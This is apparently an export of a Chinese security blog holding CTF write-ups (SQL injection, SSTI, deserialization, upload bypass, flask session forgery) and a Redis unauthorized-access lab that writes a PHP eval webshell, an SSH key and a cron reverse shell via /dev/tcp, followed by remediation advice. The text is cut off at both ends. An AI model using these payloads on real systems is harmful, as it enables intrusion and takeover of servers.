$this->process();\n    &#125;\n\n&#125;\n\nfunction is_valid($s) &#123;\n    for($i = 0; $i &lt; strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 &amp;&amp; ord($s[$i]) &lt;= 125))\n            return false;\n    return true;\n&#125;\n\n$a=new FileHandler();\n$a = serialize($a);\nif (is_valid($a))&#123;\n    var_dump($a);\n&#125;\n\npayload:\nO:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;\n\nflag在源码里：\n\nflag{6de9f1d8-d286-4269-bfc9-41943f06b108}\n[强网杯 2019]高明的黑客考点：程序编写\n下载www.tar.gz文件,解压后是很多php文件，居然有3000多个，这题肯定不是让我们审计代码，这看到猴年马月。\n随便开一个看看，发现里面乱七八糟的，但是有一些很像是一句话木马的语句。难道是要我们去找webshell在那个文件里面吗？\nimport os\nimport requests\nimport re\nimport threading\nimport time\n\nprint(\"开始时间:    \" + time.asctime(time.localtime(time.time())))\ns1 = threading.Semaphore(100)\nfilePath = \"F:/SoftWare/phpstudy_pro/WWW/src/\"\nos.chdir(filePath)\nrequests.adapters.DEFAULT_RETRIES = 5\nfiles = os.listdir(filePath)\nsession = requests.session()\nsession.keep_alive = False\n\n\ndef get_content(file):\n    s1.acquire()\n    print(\"尝试 \" + file + \"    \" + time.asctime(time.localtime(time.time())))\n    with open(file, encoding='utf-8') as f:\n        gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read()))\n        posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read()))\n        data = &#123;&#125;\n        params = &#123;&#125;\n        for m in gets:\n            params[m] = \"echo 'A1andNS';\"\n        for n in posts:\n            data[n] = \"echo A1andNS;\"\n        url = 'http://src/' + file\n        r = session.post(url, data=data, params=params)\n        r.close()\n        r.encoding = 'utf-8'\n        content = r.text\n        if \"A1andNS\" in r.text:\n            flag = 0\n            for i in gets:\n                r = session.get(url + \"?&#123;0&#125;=\".format(i) + \"echo 'A1andNS';\")\n                content = r.text\n                r.close()\n                if \"A1andNS\" in content:\n                    flag = 1\n                    break\n            if flag != 1:\n                for b in posts:\n                    r = session.post(url, data=&#123;b: \"echo 'A1andNS';\"&#125;)\n                    content = r.text\n                    r.close()\n                    if \"A1andNS\" in content:\n                        break\n            if flag == 1:\n                param = i\n            else:\n                param = b\n            print('找到了利用文件:    ' + file + \"    而且利用参数为: &#123;0&#125;\".format(param))\n            print('结束时间:    ' + time.asctime(time.localtime(time.time())))\n        s1.release()\n\n\nfor w in files:\n    t = threading.Thread(target=get_content, args=(w,))\n    t.start()\n\n\n\npayload:\nhttp:&#x2F;&#x2F;a44b5a78-c4a1-41d8-bb5f-9e9fe6dadd2e.node3.buuoj.cn&#x2F;xk0SzyKwfzw.php?Efa5BVG&#x3D;cat &#x2F;flag\n\n\n\n\n[BJDCTF 2nd]fake google考点：ssti\n随便输入，发现是get类型传入的东西会回显出来，第一时间想到了ssti。\n&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;\n\n找到了一个可以利用的类os._wrap_close\n\n写个脚本跑一下就可以找到os._wrap_close的位置了，是117\npayload:\nname&#x3D;&#123;&#123;[].__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;flag&#39;).read()&#125;&#125;\n\n\n这和巅峰极客flask的那题的做法几乎是完全一样\n[RoarCTF 2019]Easy Java考点：WEB-INF目录泄露\n上来就是一个登录界面，看一下help是什么，给出了一个java报错。\njava.io.FileNotFoundException:&#123;help.docx&#125;文件没有找到。\n但是看到了url后，我怀疑存在任意文件下载,既然是java，这里要去看看WEB-INF/web.xml文件是否可以读取。这里有个坑，要用POST请求才能访问内容：\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n-&lt;web-app version=\"4.0\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\">\n\n\n-&lt;welcome-file-list>\n\n&lt;welcome-file>Index&lt;/welcome-file>\n\n&lt;/welcome-file-list>\n\n\n-&lt;servlet>\n\n&lt;servlet-name>IndexController&lt;/servlet-name>\n\n&lt;servlet-class>com.wm.ctf.IndexController&lt;/servlet-class>\n\n&lt;/servlet>\n\n\n-&lt;servlet-mapping>\n\n&lt;servlet-name>IndexController&lt;/servlet-name>\n\n&lt;url-pattern>/Index&lt;/url-pattern>\n\n&lt;/servlet-mapping>\n\n\n-&lt;servlet>\n\n&lt;servlet-name>LoginController&lt;/servlet-name>\n\n&lt;servlet-class>com.wm.ctf.LoginController&lt;/servlet-class>\n\n&lt;/servlet>\n\n\n-&lt;servlet-mapping>\n\n&lt;servlet-name>LoginController&lt;/servlet-name>\n\n&lt;url-pattern>/Login&lt;/url-pattern>\n\n\n-&lt;servlet>\n\n&lt;servlet-name>DownloadController&lt;/servlet-name>\n\n&lt;servlet-class>com.wm.ctf.DownloadController&lt;/servlet-class>\n\n&lt;/servlet>\n\n\n-&lt;servlet-mapping>\n\n&lt;servlet-name>DownloadController&lt;/servlet-name>\n\n&lt;url-pattern>/Download&lt;/url-pattern>\n\n&lt;/servlet-mapping>\n\n\n-&lt;servlet>\n\n&lt;servlet-name>FlagController&lt;/servlet-name>\n\n&lt;servlet-class>com.wm.ctf.FlagController&lt;/servlet-class>\n\n&lt;/servlet>\n\n\n-&lt;servlet-mapping>\n\n&lt;servlet-name>FlagController&lt;/servlet-name>\n\n&lt;url-pattern>/Flag&lt;/url-pattern>\n\n&lt;/servlet-mapping>\n\n&lt;/web-app>\n\n这里可以看到四个路由，一个是/Index,/Login,/Download,/Flag\n这里也可以看到关键的路径所在，例如com.wm.ctf.FlagController\n直接访问Flag路由是会报错的。\n\njava接触的太少了，赶紧普及一下知识\n\n\n\n\n\n\n\n\n\nWEB-INF主要包含一下文件或目录: /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 \n/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 \n/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 \n/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。\n/WEB-INF/database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码\n结合上面泄露的flag文件的路径信息，和上面这个WEB-INF/classes/的知识点。\npayload:\nfilename&#x3D;WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class\n\n使用IDEA反编译打开class文件\n//\n// Source code recreated from a .class file by IntelliJ IDEA\n// (powered by FernFlower decompiler)\n//\n\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\n    name = \"FlagController\"\n)\npublic class FlagController extends HttpServlet &#123;\n    String flag = \"ZmxhZ3s2NWFhMjA0NS1hMGVhLTQ3ZGEtYTJhYi03YTViNDA2YmIxOWZ9Cg==\";\n\n    public FlagController() &#123;\n    &#125;\n\n    protected void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException &#123;\n        PrintWriter var3 = var2.getWriter();\n        var3.print(\"&lt;h1>Flag is nearby ~ Come on! ! !&lt;/h1>\");\n    &#125;\n&#125;\n\n看到了flag是base64的，解base64得到flag\n\n[GYCTF2020]Blacklist考点：sql注入、堆叠注入\n#被过滤了，可以用%23替代，经过测试数据库列数为2\n想要联合注入，得到一个直接回显\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n\n上面这些都被过滤了，用堆叠注入，这个和强网杯2019的随便注类似\n\n看到supersqli库\n\n看到一个FlagHere表\n\n发现flag列，payload：\ninject&#x3D;-1&#39;;handler FlagHere open;handler FlagHere read first;%23\n\n\n[BUUCTF 2018]Online Tool考点：代码审计\n上来给源码：\n&lt;?php\n\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123;\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n&#125;\n\nif(!isset($_GET['host'])) &#123;\n    highlight_file(__FILE__);\n&#125; else &#123;\n    $host = $_GET['host'];\n    $host = escapeshellarg($host);\n    $host = escapeshellcmd($host);\n    $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']);\n    echo 'you are in sandbox '.$sandbox;\n    @mkdir($sandbox);\n    chdir($sandbox);\n    echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);\n&#125;\n\n关于这两个函数的学习：https://www.anquanke.com/post/id/107336#h3-7\n\nnmap是可以写shell的,如上写入一个shell到sanbox中，访问一下shell.php并且post传参a进去，或者使用antsword连接都行。\n\n","slug":"BUUOJ刷题20201019-25","date":"2020-10-25T01:49:01.000Z","categories_index":"CTF","tags_index":"WEB,SUCTF,BUUOJ","author_index":"A1andNS"},{"id":"d276b23f1cbe41c451a3655655515353","title":"redis未授权访问漏洞复现","content":"之前也遇到存在未授权问题的redis服务。这里熟悉一下redis未授权。\nRedis环境搭建\n\n\n\n\n\n\n\n\nredis version: 3.2.9\nDownload Link：http://download.redis.io/releases/redis-3.2.9.tar.gz\nOperating System: CentOS Linux 7 (Core) x86_64\nredis在安装完毕初始，只能使用本地访问，不允许ip访问，所以就需要去配置一下redis.conf才能使用网络ip访问。\nUbuntu是把redis.conf放在了&#x2F;etc&#x2F;redis&#x2F;redis.conf\n1)打开配置文件把下面对应的注释掉（或者可以针对自己的ip进行bind）\n# bind 127.0.0.1\n2)Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用yes启用守护进程，设置为no\ndaemonize no\n3)保护模式\nprotected-mode no\n4)重新启动配置文件才会生效：\nredis-server redis.conf（在redis.conf文件目录下执行）\n5)关闭防火墙service iptables stop\n6)出现如下信息说明环境已配置完成\n\n这里有个重要的点一定要重启redis服务，不然配置无法生效，你还是无法连接上redis服务。\nsudo killall redis-server\nsudo redis-server redis.conf\n\n然后就可以正常连接上redis了，而不会显示被拒绝。\n下面开始我们对redis的测试：\n获取shell0x01 通过向web目录中写webshell\n\n\n\n\n\n\n\n\n测试环境\n攻击机(Deepin)：192.168.3.41\n靶机(CentOS): 192.168.3.122\n192.168.3.122:6379&gt; config set dir &#x2F;var&#x2F;www&#x2F;html\n192.168.3.122:6379&gt; config set dbfilename shell.php\n192.168.3.122:6379&gt; set x &quot;\\n\\n\\n&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;\\n\\n\\n&quot;\n192.168.3.122:6379&gt; save\n\n\n接下来使用antsword去连接我们的webshell。\n\n\n0x02 利用写计划任务执行命令反弹shell\n\n\n\n\n\n\n\n\n测试环境\n攻击机(Kali)：192.168.90.133\n靶机(CentOS): 192.168.90.132\n现在我的kali上开启一个端口监听: nc -lvnp 7777 ,然后利用redis是以root权限在运行是写crontab\n192.168.90.132:6379&gt; set x &quot;\\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.90.133&#x2F;7777 0&gt;&amp;1\\n&quot;\n192.168.90.132:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron\n192.168.90.132:6379&gt; config set dbfilename root\n192.168.90.132:6379&gt; save\n\n定时任务已经写入系统，之后就可以在kali上利用反弹过来的shell来进行操作了。\n\n成功getshell，之前出现接受不到反弹shell的问题，这里要注意一点，在登陆centos时就要用root用户来登陆，这样写进去的定时任务才能被root用户定时启动，从而达到反弹shell的目的。\n0x03 写ssh公钥，来getshell\n\n\n\n\n\n\n\n\n测试环境\n攻击机(Kali)：192.168.90.133\n靶机(CentOS): 192.168.90.132\n我现在kali上去生成一个公私钥文件。\n\n(echo -e “\\n\\n”; cat id_rsa.pub; echo -e “\\n\\n”) &gt; test.txt\n\n下面去链接redis服务：\nkali@kali:~&#x2F;.ssh$ redis-cli -h 192.168.90.132\n192.168.90.132:6379&gt; set x &quot;\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDL5&#x2F;sxDKVlQoxvaBy3gwuLJYl1miiC8Jt78AHjdcNvxIFab0ksmLaz61YdAA5MGgrRtAxVZq4hOGKKLCGcbJlVgDlINUDOw42TXgUlcgvrmVA7haovAE8bq6ZHMKDQwkWCqZiplc&#x2F;sqJQgdxL72j2vf3&#x2F;qFl&#x2F;GTwsO0MHkUgIUAQE7y+RFzwiVRN9noltUxHADQ2StrQcuJt1FVgsUNCJtrDOiRMggfjF&#x2F;7uVElk3nQsPoK7e7ERDFnZwah9IyqsOaylTInK4z10LBpRuCWT&#x2F;tfrmmAr3QLwLWRrXLEbF5KBqbQSdbx&#x2F;dUlHFFsZ7zd&#x2F;Xkla4Smu5&#x2F;uNF5stHJBU9kTvgvfF0ptH8+C3R&#x2F;LH7C0RlaOZxQAVBwI4v7JaC&#x2F;ScJg&#x2F;Px8fnRCkuScDvUvDrjDpM1nMw8OwiolvEUg3ziWhCKgoIOArfRRGT4pw2eGOUSZW&#x2F;8P31AbsCOILAUxZ7PDAN9kaR+K60idXe9FTVqY2v5XiGKJcNbFx7jFWVYokF0&#x3D; kali@kali\\n\\n&quot;\n192.168.90.132:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;\nOK\n192.168.90.132:6379&gt; config get dir\n1) &quot;dir&quot;\n2) &quot;&#x2F;root&#x2F;.ssh&quot;\n192.168.90.132:6379&gt; config set dbfilename &quot;authorized_keys&quot;\nOK\n192.168.90.132:6379&gt; save\nOK\n192.168.90.132:6379&gt; \n\n这样就在.ssh中添加了一个authorized_keys文件里，然后我们现在执行ssh去连他，就可以getshell\n\n修复方法网上收集的一些修复建议：\n1.禁止一些高危命令\n  修改 redis.conf 文件，添加  rename-command FLUSHALL “”  rename-command CONFIG “”  rename-command EVAL “”  来禁用远程修改 DB 文件地址\n2.以低权限运行 Redis 服务  为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆 $ groupadd -r redis &amp;&amp; useradd -r -g redis redis\nroot权限去运行redis服务是很危险的。\n3.为 Redis 添加密码验证  修改 redis.conf 文件，添加  requirepass mypassword\n4.禁止外网访问 Redis  修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用  bind 127.0.0.1\n上面的演示就说明了不实用bind的糟糕结果，bind 127.0.0.1可以有效的限制外网访问redis。\n5.保证 authorized_keys 文件的安全  为了保证安全，您应该阻止其他用户添加新的公钥。  将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：$ chmod 400 ~/.ssh/authorized_keys  为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：# chattr +i ~/.ssh/authorized_keys  然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：# chattr +i ~/.ssh  注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。\n这个很重要，最后一种方法即使利用这个写了一个这个文件，从而实现ssh连接服务器getshell。\n参考文章[1]. http://dwz.date/cR9H\n","slug":"redis未授权访问漏洞复现","date":"2020-10-15T08:30:39.000Z","categories_index":"学习笔记","tags_index":"漏洞复现,redis","author_index":"A1andNS"},{"id":"683add4f9a49dbf4bd3c49ba47208ffa","title":"BUU刷题2020-10-12-18","content":"[极客大挑战 2019]LoveSQL考点：SQL注入\n试了一下，在password处构造万能密码登陆\n&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39;%20or%201&#x3D;1%23\n\n\n得到了一个密码是:e9c198783c60914b393c747872a2fa52，这好像没有什么用.\n使用order by判断列数为3,表名有geekuser,l0ve1ysq1，列名有id,username,password\npayload:&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39;%20union%20select%201,2,group_concat(password)%20from%20l0ve1ysq1%23\n\n\n常规sql注入题目\n[RoarCTF 2019]Easy Calc考点：PHP解析特性\n查看一下源码写了，这里的js可以看一下,这里他说他设置了waf看来是有做一些过滤\n&lt;!--I've set up WAF to ensure security.-->\n&lt;script>\n    $('#calc').submit(function()&#123;\n        $.ajax(&#123;\n            url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()),\n            type:'GET',\n            success:function(data)&#123;\n                $(\"#result\").html(`&lt;div class=\"alert alert-success\">\n            &lt;strong>答案:&lt;/strong>$&#123;data&#125;\n            &lt;/div>`);\n            &#125;,\n            error:function()&#123;\n                alert(\"这啥?算不来!\");\n            &#125;\n        &#125;)\n        return false;\n    &#125;)\n&lt;/script>\n\n这里失去把输入的内容做url编码然后转到calc.php做处理,直接访问一下calc.php看看是什么。好家伙给了源码：\nerror_reporting(0);\nif(!isset($_GET['num']))&#123;\n    show_source(__FILE__);\n&#125;else&#123;\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) &#123;\n                if (preg_match('/' . $blackitem . '/m', $str)) &#123;\n                        die(\"what are you want to do?\");\n                &#125;\n        &#125;\n        eval('echo '.$str.';');\n&#125;\n?>\n\n这题你要你的num里面出现了字母就会回显forbidden。这里的绕过方式是利用了PHP的字符串解析特性，查询字符串在解析的过程中会将某些字符删除或用下划线替代。在解析查询字符串时，会删除空白符，然后把某些字符转换为下划线(包括空格)。这里就是用来一个删除空白符来做的。\n? num&#x3D;phpinfo()\n#num前面加上一个空格，waf就找不到num这个变量了，我用用的变量叫做&#39; num&#39;，但是在PHP解析的时候会去掉一开始的空格，这样就绕过来限制了。在字母被过滤的时候很好用。\n\n这里有个坑点，一开始还以为这个源码就是waf了，结果事情并没有这么简单。习惯看一下disable_function，看来system是用不了了，那就要用scandir()来读目录。\n\n\n发现f1agg,利用file_get_contents去读文件：\nhttp:&#x2F;&#x2F;node3.buuoj.cn:28978&#x2F;calc.php?%20num&#x3D;file_get_contents(chr(47).f1agg)\n\n得到flag：flag{8d8d4704-4ec0-4185-be86-6e6903a1f8c2}\n[极客大挑战 2019]Knife考点：签到题\n上来就要让连接shell,直接到/目录下读取flag文件得到flag,看起来应该是签到题。\n[极客大挑战 2019]Http考点：HTTP头部信息修改\n查看源代码，看到了Secret.php，访问一下。要做一个Referer\nReferer: https:&#x2F;&#x2F;www.Sycsecret.com\n\n接下来就是改UA为Syclover,还要求要本地，那就再上一个xxf,拿到flag\n \n[HCTF 2018]admin考点：flask的seesion伪造\n登陆页面直接试了一下admin、123就直接登陆成功了，但是这题应该还有别的做法吧，这应该还是非预期了。\n常规来做先注册一个用户，登陆一下注册的账号，提示不是admin。看看各个功能界面有什么东西没有。\n在/chage下看到了一个github项目，是这个题目的源码吧，把它载到本地来看看写了啥。这是用flask写的，看看他的路由有哪些，主要就是/code，/index,/register,/login,/logout,/change,/edit\n其中在index.php中告诉我们如果seesion[‘name’] = admin就可以得到flag\n用一个叫flask-unsign的工具来做flask-session的解码。得到如下结果\n\n&#123;&#39;_fresh&#39;: False, &#39;_id&#39;: b&#39;8413ea966585371366a3f87be9b31999c5d2c0351bfe38dd3b2b5b20f1e14e51f6df4e660ddd208689c3b22a79d9556dc0240b3a147b6c48ba10ad8761f5706e&#39;, &#39;csrf_token&#39;: b&#39;4725e6dae35c5e33960eec0c786f1c486a6c9198&#39;, &#39;image&#39;: b&#39;MFYe&#39;, &#39;name&#39;: &#39;alan&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n\n把name改为admin\nimport os\n\nclass Config(object):\n    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'\n    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'\n    SQLALCHEMY_TRACK_MODIFICATIONS = True\n\nsecret_key就是ckj123,\n使用工具生成新的session\na1andns@a1andns-PC:~/Software/CTF Tools$ python3 flask-unsign --sign --cookie \"&#123;'_fresh': False, '_id': b'8413ea966585371366a3f87be9b31999c5d2c0351bfe38dd3b2b5b20f1e14e51f6df4e660ddd208689c3b22a79d9556dc0240b3a147b6c48ba10ad8761f5706e', 'csrf_token': b'4725e6dae35c5e33960eec0c786f1c486a6c9198', 'image': b'MFYe', 'name': 'admin', 'user_id': '10'&#125;\" --secret \"ckj123\"\n.eJw9kMFqwzAQRH-l7DmHWG0ugRxiVJsUdkWKZCNdgus4tmQrhbgltkL-vSKFnGd4b2dvcDhdmrGD9akaxmYBB3uE9Q1evmANgu8nZEUnpGYk2wRDPWHQTEvygh-tkYPF8L4ScnBU7mcdtoFkZo1XQeSfPbLdrF1h0aUeSzVRrhIsNTO5XprIxNgxfHcVXL-JMpJd7Mt6ZXifkDR95M3EU4vsfaLoI49LkX90KNPO8PaVXOZJ1lfyagP3BdTj5XT4-e6b83MC8XqmUkVlNmAo4pkqYOijuhh0SB2FlhmXOeJtnGWckHHOdvPAWV-1zZMklTFm_5-cKx8DqI7enmEBv2NzefwNkiXc_wAus23Q.X4WlCw.EKY9v7m9KmlP5Rx_RCtWR1VL9OI\n\n\n得到flag\n[极客大挑战 2019]BabySQL考点：sql注入+重写绕过\n经过尝试，这次对*,or，by,where,union,select等关键字做了过滤,不过经过尝试，发现是把敏感字符替换为空，所以重写绕过就好了。\n?username&#x3D;admin&amp;password&#x3D;1%27+oorrder+bbyy+3%23\n列数为3\nusername&#x3D;admin&amp;password&#x3D;1%27+ununionion+seselectlect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema&#x3D;database()%23\n#表名b4bsql,geekuser\nusername&#x3D;admin&amp;password&#x3D;1%27+ununionion+seselectlect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_name&#x3D;&#39;b4bsql&#39;%23\n#列名id,username,password\n爆数据password\nusername&#x3D;admin&amp;password&#x3D;1%27+ununionion+seselectlect+1,2,group_concat(passwoorrd)+frfromom+b4bsql%23\n得到flag\n\n\n\n[极客大挑战 2019]Upload考点：文件上传绕过，phtml绕过后缀\n一个图片上传入口，先传一张图片看看，成功后只显示文件名，而不显示路径，但是一般应该就是upload下，试一下访问成功。下面开始穿马\n\n过滤php、php3、php4后缀，大小写绕不过去，内容过滤&lt;?\n所以用phtml后缀，加上script的写法，成功绕过，然后到根目录下找到/flag文件。\n[ACTF2020 新生赛]BackupFile考点：备份文件泄漏，PHP整形和字符串比较\n看题目和提示就是要下载备份文件，试一下index.php.bak，得到源码\n&lt;?php\ninclude_once \"flag.php\";\n\nif(isset($_GET['key'])) &#123;\n    $key = $_GET['key'];\n    if(!is_numeric($key)) &#123;\n        exit(\"Just num!\");\n    &#125;\n    $key = intval($key);\n    $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\";\n    if($key == $str) &#123;\n        echo $flag;\n    &#125;\n&#125;\nelse &#123;\n    echo \"Try to find out source file!\";\n&#125;\n\n这里的key要和str相等，但是key数字，其实只要让key=123就可以实现这个语句的判断通过了。\n传入key=123，得到flag：flag{89c53a10-3152-4a2f-8338-f0dea20a8a7e}\n[ACTF2020 新生赛]Upload考点：文件上传绕过前端和后端\n上来先看一下源码，看到在form中有一个onsubmit=”return checkFile()”\n先把php文件改为jpg文件来绕过前端验证，然后该文件后缀为phtml绕过，php、php3、php4都被过滤。然后连接shell就可以去拿flag了，flag在/目录下\n[SUCTF 2019]CheckIn考点：文件上传\n老规矩上传一张图片看看情况。图片上传后,居然是回显内容里&lt;?，看来又是过滤了&lt;?，直接上马吧。php显示后缀非法，但是奇怪的是只要是jpg后缀就说内容里有&lt;?，继续做。\n用script和jpg后缀是可以上传的，但是.htaccess被ban了，还好还可以用.user.ini\n\n上传一个.user.ini文件\nGIF89a\nauto_prepend_file&#x3D;1.jpg\n\n\n这样php文件在一开始就会包含1.jpg,所以jpg格式的马也可以得到执行。直接用蚁剑去连接uplaod/xxxxxx/index.php\n[极客大挑战 2019]BuyFlag考点：代码审计，PHP特征\n看了一下，看到两个页面，一个是index.php，另一个是pay.php。\n看一下pay.php，显示一段话\nIf you want to buy the FLAG:\nYou must be a student from CUIT!!!\nYou must be answer the correct password!!!\nOnly Cuit&#39;s students can buy the FLAG\n\n查看一下网页前端代码，发现了php源码。\n&lt;!--\n\t~~~post money and password~~~\nif (isset($_POST['password'])) &#123;\n\t$password = $_POST['password'];\n\tif (is_numeric($password)) &#123;\n\t\techo \"password can't be number&lt;/br>\";\n\t&#125;elseif ($password == 404) &#123;\n\t\techo \"Password Right!&lt;/br>\";\n\t&#125;\n&#125;\n-->\n\n抓个包，要让自己变成cuiter就要把http头部cookie改为 user=1\n然后构造一个password=404a,money=100000000,结果说数字太长了。这里可以用money[]=100000000来绕过，这样的话money会被当做一个array。另一种做法money=1e9，这种是利用了计算机对科学计数法的使用。\n\n[BJDCTF2020]Easy MD5考点：md5(string,true)\nreponse头有提示\nHint: select * from 'admin' where password=md5($pass,true)\n\n这里学习了一下:https://blog.csdn.net/March97/article/details/81222922\nsql在识别’1abs’这样的字符串会被当做整型，所以可以利用这一点来构造一个类似与\n`select * from 'admin' where password= ''or'6�]��!r,��b'`\n\n这里记录两个可以用的payload：ffifdyop、129581926211651571912466741651878684928\n这里md5生成的32位16进制码，每2位16进制作为一个原始二进制，也就是没2位16进制做一下ascii码的转换。\n类似的还有，需要写一个脚本来获取，由于hash的血崩效应，这样我们基本就要遍历每一个可能的hash值才能找到我们需要的，这意味着要耗费极其大量的时间。我们需要有276f7227+（31-39）这个字段，就可以满足要求。比如xxxxxxxxxxxxxxxx276f7227（31-39）xxxxxx\n成功使用payload的过关后，跳转到一个新的关卡，显示 Do you like md5, 接着看一下源代码：\n&lt;!--\n$a = $GET['a'];\n$b = $_GET['b'];\n\nif($a != $b &amp;&amp; md5($a) == md5($b))&#123;\n    // wow, glzjin wants a girl friend.\n-->\n\n这个很容易，payload：\nhttp:&#x2F;&#x2F;7dfb0fbd-6519-4c8b-a2ef-62d6f72c9f5c.node3.buuoj.cn&#x2F;levels91.php?a[]&#x3D;1&amp;b[]&#x3D;2\n\n进入下一关，给出来源码：\n&lt;?php\nerror_reporting(0);\ninclude \"flag.php\";\n\nhighlight_file(__FILE__);\n\nif($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2']))&#123;\n    echo $flag;\n&#125;\n\n\n","slug":"BUU刷题2020-10-12-18","date":"2020-10-13T10:28:01.000Z","categories_index":"CTF","tags_index":"CTF,BUUOJ","author_index":"A1andNS"},{"id":"0c2fa944cd89422ab54a5eca03b47d0e","title":"西湖论剑2020复现","content":"今天NU1L和ChaMD5出了Web的WP，赶紧趁热复现一手。\nhardxss这题只有两个功能点，一个是子域名爆破，一个是联系站长。试了一下子域名爆破就是个幌子，关键应该在于联系站长的功能。\n嘿~想给我报告BUG链接请解开下面的验证码，只能给我发我网站开头的链接给我哟~我收到邮件后会先点开链接然后登录我的网站！\n&gt; hash &#x3D; md5(vcode)\n&gt; console.log(&#39;验证码:&#39;+hash.substr(0,5))\n------------------------------------------------------------\n验证码:2d7b1\n\n这里说我们智能发送这个网站开头的链接给他，并且他会先点开链接然后登录，这感觉上就是要XSS了，我们先试一试吧。查看源代码时发现了一个/login的路由，就是admin login。看看吧,是一个登录框，它会把表单提交到https://auth.hardxss.xhlj.wetolink.com/api/loginVerify去做验证。\n根据NU1L的思路，这是要考察xss持久化。然后xss持久化的话有两种方式，分别是serviceworker和cache。这里的cache没法用，所以就要去使用serviceworker，而要去使用serviceworker就要找到一个xss的点，去做一个注册，注册一个serviceworker.\n然后在/login页面下查看script可以看到jsonp，而且没有做过滤，所以就可以在这个路由下来做一个xss.用户的帐号密码是传送到啦auth.hardxss.域名，所以要注册一个serviceworker，需要serviceworker的js在auth.xss域名下，也就是需要找到一个可控点去放置serviceworker的js。\n很可惜到这就无法继续了，果然还是太菜了，希望官方什么时候也可以出一个WP，再详细学一下。\nFlagShop在首页的javascript脚本里发现了一个任意文件读取的点\n$.get(\"backend.php\", &#123;\n    readfile: \"data/FakeCTFer.txt\"\n\nview-source:http:&#x2F;&#x2F;flagshop.xhlj.wetolink.com&#x2F;sandbox&#x2F;b208d5a1-0af7-4d43-815a-7666795a8dc6&#x2F;backend.php?readfile&#x3D;backend.php\n\n读取backend.php源代码：\n\n&lt;?php\n$offset = isset($_GET['offset']) ? $_GET['offset'] : 0;\n$buffer = isset($_GET['buffer']) ? $_GET['buffer'] : \"\";\n\nif (isset($_GET['writefile'])) &#123;\n    $fp = fopen($_GET['writefile'], \"a\");\n    fseek($fp, $offset);\n    fwrite($fp, $buffer);\n    fclose($fp);\n&#125;\n\nif (isset($_GET['readfile'])) &#123;\n    echo 